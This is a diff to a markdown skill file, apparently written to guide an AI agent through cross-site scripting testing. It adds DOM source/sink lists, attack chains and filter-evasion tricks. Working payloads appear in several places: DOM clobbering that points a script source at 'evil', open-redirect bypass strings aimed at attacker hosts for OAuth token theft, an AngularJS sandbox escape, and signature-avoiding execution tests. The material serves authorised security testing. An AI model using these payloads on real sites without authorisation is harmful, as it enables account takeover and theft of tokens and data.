@@ -1,6 +1,6 @@
 ---
 name: xss
-description: "Use when the user is testing for cross-site scripting (reflected, stored, DOM-based), CSP bypass, sink analysis, mXSS, AngularJS sandbox escape, or any client-side JS injection."
+description: "Use when the user is testing for cross-site scripting (reflected, stored, DOM-based), CSP bypass, sink analysis, mXSS, AngularJS sandbox escape, or any client-side JS injection — including DOM clobbering, client-side prototype pollution, DOM open redirect, and client-side template injection (AngularJS / Vue / React)."
 ---
 
 # /xss - Cross-Site Scripting Hunting
@@ -15,6 +15,31 @@ XSS is a sink hunt, not a payload hunt. Don't spray `<script>alert(1)</script>` 
 3. **JS context** — break out of string, statement-inject
 
 For DOM XSS: it's all about source → sink. Find the source (`location`, `postMessage`, `cookie`, `localStorage`), trace it to a dangerous sink (`innerHTML`, `eval`, `document.write`, `setAttribute('on*', ...)`).
+
+## DOM vulnerability family
+
+DOM-based vulns run entirely in the victim's JS engine — the **server never processes the
+payload** (URL fragments after `#`, `window.name`, and `postMessage` are invisible to it). A
+clean path must be traced from a **Source** to a vulnerable **Sink**.
+
+| Vulnerability | Criticality | Impact |
+|---|---|---|
+| DOM XSS | **Critical** | session hijack, ATO, real-time PII exfil, client-side request forgery |
+| Web Message (`postMessage`) | **High** | same-origin-policy breach; data theft between tabs/iframes; usually escalates to global DOM XSS |
+| DOM Open Redirect | **Medium/High** | credible phishing off the legit domain; **primary vector for stealing OAuth authorization codes / access tokens** |
+
+**Sources** (attacker-reachable entry points): `document.URL/documentURI/URLUnencoded/baseURI`,
+`location.{search,hash,pathname,href}`, `document.cookie`, `window.name`, `local/sessionStorage`,
+`document.referrer`, `history.{pushState,replaceState}`, `IndexedDB`. Two cross-flow shapes:
+*reflected/stored data re-read insecurely by client JS* (e.g. a hidden input read into
+`innerHTML`), and *cross-origin web messages* where `event.origin` isn't strictly validated.
+
+**Sinks** ship in [`recon/dom-sinks.txt`](../recon/dom-sinks.txt) (HTML injection, code
+execution, navigation/URL, jQuery, framework sanitizer bypass, source markers, postMessage).
+Advanced DOM families each get a companion doc — [dom-clobbering](dom-clobbering.md),
+[prototype-pollution](prototype-pollution.md), [dom-open-redirect](dom-open-redirect.md),
+[csti](csti.md) — plus the live [`playwright-dom-debugging`](playwright-dom-debugging.md)
+harness for confirming any flow headless.
 
 ## XSS Chains (from real reports)
 
@@ -66,6 +91,29 @@ For DOM XSS: it's all about source → sink. Find the source (`location`, `postM
 * Base-URI not set → `<base href="//attacker.com/">` redirects relative scripts
 * `default-src 'none'` but `style-src 'unsafe-inline'` → CSS exfil tricks
 
+### Chain 9: DOM Clobbering
+1. HTML-injection foothold that CSP/sanitizer blocks from full XSS (comment, rich-text, page param)
+2. App reads a global you can shadow, e.g. `window.config?.apiBase || "/api/v1/user"` → `script.src`
+3. Inject `<a id="config" name="apiBase" href="https://evil/x.js">` → `window.config.apiBase` returns the `<a>`'s `href`
+4. **High-value variant:** clobber a config the page passes to a CSP-allow-listed JSONP/CDN endpoint → execution under the trusted origin = CSP bypass. → [dom-clobbering.md](dom-clobbering.md)
+
+### Chain 10: Client-Side Prototype Pollution
+1. Insecure recursive parser (deparam / `$.extend(true,…)` / `_.merge`) writes to `__proto__` or `constructor.prototype`
+2. Pollute `Object.prototype` via `?__proto__[x]=y` (or `?constructor[prototype][x]=y` to dodge `__proto__` filters)
+3. A latent sink reads a property that normally doesn't exist → inherits your payload, e.g. `cfg.sourceURL || "/js/default.js"` fed to `eval`/`Function`. → [prototype-pollution.md](prototype-pollution.md)
+
+### Chain 11: DOM Open Redirect → OAuth token theft
+1. Client script feeds an attacker URL into a navigation sink: `location = param`, `window.open(param)`, `location.replace(param)`
+2. Param names: `redirect`/`redirect_uri`, `next`, `url`, `returnUrl`, `continue`, `r` — often read by JS only (server never sees it)
+3. Beat a weak domain check: `https://victim.tld@attacker.tld` (user-info `@`), `victim.tld.attacker.tld` (fake subdomain), `//attacker.tld` (protocol-relative), `victim.tld\/@attacker.tld` (backslash parser-confusion)
+4. Land the OAuth `code`/`access_token` (often in the fragment) on your host → ATO. Confirm the ATO leg in `/ato`. → [dom-open-redirect.md](dom-open-redirect.md)
+
+### Chain 12: CSTI in modern frameworks
+1. User data lands inside a framework-managed binding, not a plain HTML sink — payload is expression syntax (`{{ }}`), evading `<script>`-string WAFs
+2. **AngularJS 1.x:** `{{constructor.constructor('pro\x6dpt(1)')()}}` (sandbox escape, version-tuned)
+3. **Vue:** `{{ }}` in a client-compiled template (Vue 2 gadgets; Vue 3 via `compile()`/dynamic templates); `v-html` is a separate raw-HTML sink
+4. **React:** no CSTI (auto-escapes) — hunt `dangerouslySetInnerHTML` + `href`/`src` instead. → [csti.md](csti.md)
+
 ## Discovery Methodology
 
 ### Step 1: Reflected — input mapping
@@ -106,6 +154,23 @@ snippets that hook sinks (with stack traces), wiretap + fuzz `postMessage`, do l
 source→sink taint tracing, and capture CSP violations. Use it the moment `ugrep` finds a sink
 or a message handler and you can't tell from the HTTP response whether the flow is real.
 
+**Complementary surface-mapping for the DOM families:**
+* **Semgrep** — community JS rules over the saved `js/` tree catch sink/source patterns `ugrep`
+  regexes miss (data-flow-aware). A complement to `ugrep`, not a replacement: `semgrep --config=p/javascript --json js/`.
+* **DOM Invader** (Burp browser) — interactive source/sink + `postMessage` canary tracing. GUI
+  tool; the headless Playwright harness above is this repo's automated equivalent when you're
+  without Burp.
+* **Console `postMessage` triage** — paste once to log every message and its origin before you
+  commit to the full wiretap:
+  ```js
+  window.addEventListener("message", e => console.log("Origin:", e.origin, "Data:", e.data), true);
+  ```
+* **Advanced families** — when `ugrep` surfaces the shape, drop into the matching doc:
+  global-property reads + HTML-injection foothold → [dom-clobbering.md](dom-clobbering.md);
+  insecure merge/deparam → [prototype-pollution.md](prototype-pollution.md);
+  `location`/`window.open` from a param → [dom-open-redirect.md](dom-open-redirect.md);
+  framework binding context → [csti.md](csti.md).
+
 ### Step 5: Stored
 * Every persistence boundary: profile, posts, comments, tickets, files, custom fields
 * For each, plant a unique payload. Visit the rendering page as victim role (or yourself).
@@ -118,6 +183,15 @@ or a message handler and you can't tell from the HTTP response whether the flow 
 * Show what's exfiltrable: cookie, CSRF token, account data, ability to act on victim's behalf
 * If CSP is in play, show the bypass (or note the CSP's effective protection level)
 * Specify: same-origin or sandboxed? With or without auth?
+
+**Proving execution when `alert`/`eval` are filtered.** A WAF or CSP may block the literal
+`alert(` signature; prove execution another way. Less-signed alternatives: `print()`,
+`` prompt`1` ``, `confirm(document.domain)`. Signature-avoiding: `window['al'+'ert'](1)`,
+`[].constructor.constructor("pro"+"mpt(1)")()`. **Headless caveat:** a native `alert()` dialog
+is auto-dismissed and won't paint in a screenshot — prove execution with a *visible DOM effect*
+(`document.title='XSS-<marker>'`, a page marker, a `console.log`, or a `fetch()` to your
+HTTPWorkbench instance) per [`playwright-dom-debugging.md`](playwright-dom-debugging.md). The
+full filter-evasion corpus lives in `/waf-bypass`.
 
 ## Key Considerations
 
